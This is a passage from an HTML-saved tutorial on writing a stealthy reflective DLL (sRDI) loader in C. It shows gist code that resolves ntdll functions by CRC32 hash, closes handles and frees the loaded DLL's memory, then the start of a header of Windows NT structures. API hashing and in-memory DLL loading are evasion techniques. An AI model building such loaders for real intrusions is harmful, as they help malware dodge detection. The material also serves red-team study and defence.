          <td id="file-stealth_step_7-c-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-stealth_step_7-c-LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *p_nt_close = get_proc_address_by_hash(p_ntdll, NtClose_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-stealth_step_7-c-LC5" class="blob-code blob-code-inner js-file-line">NtClose_t g_nt_close = (NtClose_t) p_nt_close;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-stealth_step_7-c-LC6" class="blob-code blob-code-inner js-file-line"><span class="pl-en">g_nt_close</span>(h_file);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-stealth_step_7-c-LC7" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-stealth_step_7-c-LC8" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *p_nt_free_virtual_memory = get_proc_address_by_hash(p_ntdll, NtFreeVirtualMemory_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-stealth_step_7-c-LC9" class="blob-code blob-code-inner js-file-line">NtFreeVirtualMemory_t g_nt_free_virtual_memory = (NtFreeVirtualMemory_t)p_nt_free_virtual_memory;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-stealth_step_7-c-LC10" class="blob-code blob-code-inner js-file-line"><span class="pl-en">g_nt_free_virtual_memory</span>(((HANDLE) -1), &amp;dll_bytes, &amp;dll_size, MEM_RELEASE);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/3e94fc8a5fd57ce5f491102f5707ef6d/raw/b84e041004e24b451578836c7d567a4a22861312/stealth_step_7.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/3e94fc8a5fd57ce5f491102f5707ef6d#file-stealth_step_7-c">
          stealth_step_7.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>The above code calculates the address of the <code>DLLEntry</code> function within the DLL, calls it with appropriate arguments, retrieves and casts function pointers for <code>NtClose</code> and <code>NtFreeVirtualMemory</code> functions from the ntdll module, and calls them with relevant arguments. These operations likely involve handling DLL initialization, closing handles or files, and releasing virtual memory allocated for the DLL.</p><!--kg-card-end: html--><hr><h2 id="stealth-final">Stealth Final</h2><p>With all the code together, including all the new function definitions and hashes, it should look like the following.</p><!--kg-card-begin: html--><p><code>structs.h</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/c7746095ae047ba80ae86ac243f5fb6a.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121814455" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-structs-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="structs.h">
        <tbody><tr>
          <td id="file-structs-h-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-structs-h-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>windows.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-structs-h-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-structs-h-LC2" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-structs-h-LC3" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">pragma</span> clang diagnostic push</td>
        </tr>
        <tr>
          <td id="file-structs-h-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-structs-h-LC4" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">pragma</span> ide diagnostic ignored "bugprone-reserved-identifier"</td>
        </tr>
        <tr>
          <td id="file-structs-h-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-structs-h-LC5" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-structs-h-LC6" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> BASE_RELOCATION_BLOCK {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-structs-h-LC7" class="blob-code blob-code-inner js-file-line">    DWORD PageAddress;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-structs-h-LC8" class="blob-code blob-code-inner js-file-line">    DWORD BlockSize;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-structs-h-LC9" class="blob-code blob-code-inner js-file-line">} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-structs-h-LC10" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-structs-h-LC11" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> BASE_RELOCATION_ENTRY {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-structs-h-LC12" class="blob-code blob-code-inner js-file-line">    USHORT Offset : <span class="pl-c1">12</span>;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-structs-h-LC13" class="blob-code blob-code-inner js-file-line">    USHORT Type : <span class="pl-c1">4</span>;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-structs-h-LC14" class="blob-code blob-code-inner js-file-line">} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-structs-h-LC15" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-structs-h-LC16" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> _UNICODE_STRING {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-structs-h-LC17" class="blob-code blob-code-inner js-file-line">    USHORT Length;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-structs-h-LC18" class="blob-code blob-code-inner js-file-line">    USHORT MaximumLength;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-structs-h-LC19" class="blob-code blob-code-inner js-file-line">    PWSTR Buffer;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-structs-h-LC20" class="blob-code blob-code-inner js-file-line">} UNICODE_STRING, *PUNICODE_STRING;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-structs-h-LC21" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-structs-h-LC22" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> _OBJECT_ATTRIBUTES {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-structs-h-LC23" class="blob-code blob-code-inner js-file-line">    ULONG Length;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-structs-h-LC24" class="blob-code blob-code-inner js-file-line">    HANDLE RootDirectory;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-structs-h-LC25" class="blob-code blob-code-inner js-file-line">    PUNICODE_STRING ObjectName;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-structs-h-LC26" class="blob-code blob-code-inner js-file-line">    ULONG Attributes;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L27" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-structs-h-LC27" class="blob-code blob-code-inner js-file-line">    PVOID SecurityDescriptor;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L28" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-structs-h-LC28" class="blob-code blob-code-inner js-file-line">    PVOID SecurityQualityOfService;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L29" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-structs-h-LC29" class="blob-code blob-code-inner js-file-line">} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L30" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-structs-h-LC30" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L31" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-structs-h-LC31" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> _IO_STATUS_BLOCK {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L32" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-structs-h-LC32" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">union</span> {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L33" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-structs-h-LC33" class="blob-code blob-code-inner js-file-line">        NTSTATUS Status;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L34" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-structs-h-LC34" class="blob-code blob-code-inner js-file-line">        PVOID Pointer;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L35" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-structs-h-LC35" class="blob-code blob-code-inner js-file-line">    } DUMMYUNIONNAME;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L36" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="file-structs-h-LC36" class="blob-code blob-code-inner js-file-line">    ULONG_PTR Information;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L37" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="37"></td>
          <td id="file-structs-h-LC37" class="blob-code blob-code-inner js-file-line">} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L38" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="38"></td>
          <td id="file-structs-h-LC38" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L39" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="39"></td>
          <td id="file-structs-h-LC39" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> _FILE_STANDARD_INFORMATION {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L40" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="40"></td>
          <td id="file-structs-h-LC40" class="blob-code blob-code-inner js-file-line">    LARGE_INTEGER AllocationSize;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L41" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="41"></td>
          <td id="file-structs-h-LC41" class="blob-code blob-code-inner js-file-line">    LARGE_INTEGER EndOfFile;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L42" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="42"></td>
          <td id="file-structs-h-LC42" class="blob-code blob-code-inner js-file-line">    ULONG NumberOfLinks;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L43" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="43"></td>
          <td id="file-structs-h-LC43" class="blob-code blob-code-inner js-file-line">    BOOLEAN DeletePending;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L44" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="44"></td>
          <td id="file-structs-h-LC44" class="blob-code blob-code-inner js-file-line">    BOOLEAN Directory;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L45" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="45"></td>
          <td id="file-structs-h-LC45" class="blob-code blob-code-inner js-file-line">} FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L46" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="46"></td>
          <td id="file-structs-h-LC46" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L47" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="47"></td>
          <td id="file-structs-h-LC47" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">enum</span> _FILE_INFORMATION_CLASS {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L48" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="48"></td>
          <td id="file-structs-h-LC48" class="blob-code blob-code-inner js-file-line">    FileDirectoryInformation = <span class="pl-c1">1</span>,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L49" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="49"></td>
          <td id="file-structs-h-LC49" class="blob-code blob-code-inner js-file-line">    FileFullDirectoryInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L50" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="50"></td>
          <td id="file-structs-h-LC50" class="blob-code blob-code-inner js-file-line">    FileBothDirectoryInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L51" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="51"></td>
          <td id="file-structs-h-LC51" class="blob-code blob-code-inner js-file-line">    FileBasicInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L52" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="52"></td>
          <td id="file-structs-h-LC52" class="blob-code blob-code-inner js-file-line">    FileStandardInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L53" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="53"></td>
          <td id="file-structs-h-LC53" class="blob-code blob-code-inner js-file-line">    FileInternalInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L54" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="54"></td>
          <td id="file-structs-h-LC54" class="blob-code blob-code-inner js-file-line">    FileEaInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L55" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="55"></td>
          <td id="file-structs-h-LC55" class="blob-code blob-code-inner js-file-line">    FileAccessInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L56" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="56"></td>
          <td id="file-structs-h-LC56" class="blob-code blob-code-inner js-file-line">    FileNameInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L57" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="57"></td>
          <td id="file-structs-h-LC57" class="blob-code blob-code-inner js-file-line">    FileRenameInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L58" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="58"></td>
          <td id="file-structs-h-LC58" class="blob-code blob-code-inner js-file-line">    FileLinkInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L59" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="59"></td>
          <td id="file-structs-h-LC59" class="blob-code blob-code-inner js-file-line">    FileNamesInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L60" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="60"></td>
          <td id="file-structs-h-LC60" class="blob-code blob-code-inner js-file-line">    FileDispositionInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L61" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="61"></td>
          <td id="file-structs-h-LC61" class="blob-code blob-code-inner js-file-line">    FilePositionInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L62" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="62"></td>
          <td id="file-structs-h-LC62" class="blob-code blob-code-inner js-file-line">    FileFullEaInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L63" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="63"></td>
          <td id="file-structs-h-LC63" class="blob-code blob-code-inner js-file-line">    FileModeInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L64" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="64"></td>
          <td id="file-structs-h-LC64" class="blob-code blob-code-inner js-file-line">    FileAlignmentInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L65" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="65"></td>
          <td id="file-structs-h-LC65" class="blob-code blob-code-inner js-file-line">    FileAllInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L66" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="66"></td>
          <td id="file-structs-h-LC66" class="blob-code blob-code-inner js-file-line">    FileAllocationInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L67" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="67"></td>
          <td id="file-structs-h-LC67" class="blob-code blob-code-inner js-file-line">    FileEndOfFileInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L68" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="68"></td>
          <td id="file-structs-h-LC68" class="blob-code blob-code-inner js-file-line">    FileAlternateNameInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L69" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="69"></td>
          <td id="file-structs-h-LC69" class="blob-code blob-code-inner js-file-line">    FileStreamInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L70" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="70"></td>
          <td id="file-structs-h-LC70" class="blob-code blob-code-inner js-file-line">    FilePipeInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L71" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="71"></td>
          <td id="file-structs-h-LC71" class="blob-code blob-code-inner js-file-line">    FilePipeLocalInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L72" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="72"></td>
          <td id="file-structs-h-LC72" class="blob-code blob-code-inner js-file-line">    FilePipeRemoteInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L73" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="73"></td>
          <td id="file-structs-h-LC73" class="blob-code blob-code-inner js-file-line">    FileMailslotQueryInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L74" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="74"></td>
          <td id="file-structs-h-LC74" class="blob-code blob-code-inner js-file-line">    FileMailslotSetInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L75" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="75"></td>
          <td id="file-structs-h-LC75" class="blob-code blob-code-inner js-file-line">    FileCompressionInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L76" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="76"></td>
          <td id="file-structs-h-LC76" class="blob-code blob-code-inner js-file-line">    FileObjectIdInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L77" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="77"></td>
          <td id="file-structs-h-LC77" class="blob-code blob-code-inner js-file-line">    FileCompletionInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L78" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="78"></td>
          <td id="file-structs-h-LC78" class="blob-code blob-code-inner js-file-line">    FileMoveClusterInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L79" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="79"></td>
          <td id="file-structs-h-LC79" class="blob-code blob-code-inner js-file-line">    FileQuotaInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L80" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="80"></td>
          <td id="file-structs-h-LC80" class="blob-code blob-code-inner js-file-line">    FileReparsePointInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L81" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="81"></td>
          <td id="file-structs-h-LC81" class="blob-code blob-code-inner js-file-line">    FileNetworkOpenInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L82" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="82"></td>
          <td id="file-structs-h-LC82" class="blob-code blob-code-inner js-file-line">    FileAttributeTagInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L83" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="83"></td>
          <td id="file-structs-h-LC83" class="blob-code blob-code-inner js-file-line">    FileTrackingInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L84" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="84"></td>
          <td id="file-structs-h-LC84" class="blob-code blob-code-inner js-file-line">    FileIdBothDirectoryInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L85" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="85"></td>
          <td id="file-structs-h-LC85" class="blob-code blob-code-inner js-file-line">    FileIdFullDirectoryInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L86" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="86"></td>
          <td id="file-structs-h-LC86" class="blob-code blob-code-inner js-file-line">    FileValidDataLengthInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L87" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="87"></td>
          <td id="file-structs-h-LC87" class="blob-code blob-code-inner js-file-line">    FileShortNameInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L88" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="88"></td>
          <td id="file-structs-h-LC88" class="blob-code blob-code-inner js-file-line">    FileIoCompletionNotificationInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L89" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="89"></td>
          <td id="file-structs-h-LC89" class="blob-code blob-code-inner js-file-line">    FileIoStatusBlockRangeInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L90" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="90"></td>
          <td id="file-structs-h-LC90" class="blob-code blob-code-inner js-file-line">    FileIoPriorityHintInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L91" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="91"></td>
          <td id="file-structs-h-LC91" class="blob-code blob-code-inner js-file-line">    FileSfioReserveInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L92" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="92"></td>
          <td id="file-structs-h-LC92" class="blob-code blob-code-inner js-file-line">    FileSfioVolumeInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L93" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="93"></td>
          <td id="file-structs-h-LC93" class="blob-code blob-code-inner js-file-line">    FileHardLinkInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L94" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="94"></td>
          <td id="file-structs-h-LC94" class="blob-code blob-code-inner js-file-line">    FileProcessIdsUsingFileInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L95" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="95"></td>
          <td id="file-structs-h-LC95" class="blob-code blob-code-inner js-file-line">    FileNormalizedNameInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L96" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="96"></td>
          <td id="file-structs-h-LC96" class="blob-code blob-code-inner js-file-line">    FileNetworkPhysicalNameInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L97" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="97"></td>
          <td id="file-structs-h-LC97" class="blob-code blob-code-inner js-file-line">    FileIdGlobalTxDirectoryInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L98" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="98"></td>
          <td id="file-structs-h-LC98" class="blob-code blob-code-inner js-file-line">    FileIsRemoteDeviceInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L99" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="99"></td>
          <td id="file-structs-h-LC99" class="blob-code blob-code-inner js-file-line">    FileUnusedInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L100" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="100"></td>
          <td id="file-structs-h-LC100" class="blob-code blob-code-inner js-file-line">    FileNumaNodeInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L101" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="101"></td>
          <td id="file-structs-h-LC101" class="blob-code blob-code-inner js-file-line">    FileStandardLinkInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L102" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="102"></td>
          <td id="file-structs-h-LC102" class="blob-code blob-code-inner js-file-line">    FileRemoteProtocolInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L103" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="103"></td>
          <td id="file-structs-h-LC103" class="blob-code blob-code-inner js-file-line">    FileRenameInformationBypassAccessCheck,</td>
        </tr>
        <tr>
